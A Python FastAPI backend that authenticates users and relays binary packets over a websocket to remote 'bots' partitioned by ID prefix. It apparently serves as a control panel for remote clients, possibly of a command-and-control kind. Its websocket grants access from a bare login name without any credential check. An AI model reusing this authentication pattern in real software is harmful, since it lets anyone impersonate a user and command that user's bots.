import uvicorn, asyncio, json
from pathlib import Path
from contextlib import asynccontextmanager
from fastapi import FastAPI, WebSocket, WebSocketDisconnect, Query, Body
from fastapi.staticfiles import StaticFiles
from fastapi.responses import RedirectResponse

from .Database import verify_user, register_user, load_db, load_bots_from_file
from .ZmqDispatcher import zmq_pull_task_loop
from backend import ZMQ_WORKER_PUSH_API
from backend.Services import send_binary_to_bot
from logs import Log as logger


class ConnectionManager:
    def __init__(self):
        self.active_connections = {}

    async def connect(self, ws, login, user):
        await ws.accept()
        self.active_connections.setdefault(login, {
            "sockets": [], "role": user["role"], "prefix": user["prefix"]
        })["sockets"].append(ws)
        logger.info(f"[API] [+] {login} (Active: {len(self.active_connections[login]['sockets'])})")

    def disconnect(self, ws, login):
        if login in self.active_connections:
            self.active_connections[login]["sockets"].remove(ws)
            if not self.active_connections[login]["sockets"]:
                del self.active_connections[login]
        logger.info(f"[API] [-] {login}")


manager = ConnectionManager()


def pack_bot_to_binary(bot_id, payload):
    """Сборка бинарного пакета: [ID_L][ID][Mod_L][Mod][Pay_L][Payload]"""
    payload["id"] = payload.get("id", bot_id)
    b_id, b_mod, b_pay = bot_id.encode(), b"DataScribe", json.dumps(payload).encode()
    return (len(b_id).to_bytes(1, 'big') + b_id +
            len(b_mod).to_bytes(1, 'big') + b_mod +
            len(b_pay).to_bytes(4, 'big') + b_pay)


def check_access(user_role, user_prefix, target_id):
    """Централизованная проверка прав доступа"""
    return user_role == "admin" or user_prefix == "ALL" or target_id.startswith(user_prefix)


@asynccontextmanager
async def lifespan(app: FastAPI):
    task = asyncio.create_task(zmq_pull_task_loop(manager.active_connections, ZMQ_WORKER_PUSH_API))
    yield
    task.cancel()


app = FastAPI(lifespan=lifespan)
FRONTEND_DIR = Path(__file__).resolve().parent.parent.parent / "frontend"
app.mount("/sidebar", StaticFiles(directory=FRONTEND_DIR, html=True), name="static")


@app.get("/")
async def root(): return RedirectResponse("/sidebar/auth/auth.html")


@app.post("/{action}")
async def auth_handler(action: str, data=Body(...)):
    if action == "register":
        return {"status": "ok"} if register_user(data.get("login"), data.get("password")) else {"status": "error"}
    if action == "login":
        u = verify_user(data.get("login"), data.get("password"))
        return {"status": "ok", **u} if u else {"status": "error"}


@app.websocket("/ws")
async def websocket_endpoint(ws: WebSocket, login: str = Query(None)):
    user = load_db().get(login)
    if not user: return await ws.close(1008)

    await manager.connect(ws, login, user)
    role, prefix = user["role"], user["prefix"]

    # Инициализация списка ботов из БД
    try:
        bots = load_bots_from_file()
        for bid, payload in bots.items():
            if check_access(role, prefix, bid):
                await ws.send_bytes(pack_bot_to_binary(bid, payload))
        logger.info(f"[API] Initialized {len(bots)} bots for {login}")
    except Exception as e:
        logger.error(f"[API] Init error: {e}")

    try:
        while True:
            msg = await ws.receive()
            if msg.get("type") == "ui.disconnect": break

            if "bytes" in msg:
                pkt = msg["bytes"]
                try:
                    target_id = pkt[1:1 + pkt[0]].decode(errors='ignore')
                    if check_access(role, prefix, target_id):
                        if not await send_binary_to_bot(target_id, pkt):
                            logger.warning(f"[API] {target_id} offline")
                except:
                    continue
    except:
        pass
    finally:
        manager.disconnect(ws, login)


async def run_fastapi_server(host, port):
    await uvicorn.Server(uvicorn.Config(app, host=host, port=port, log_level="warning")).serve()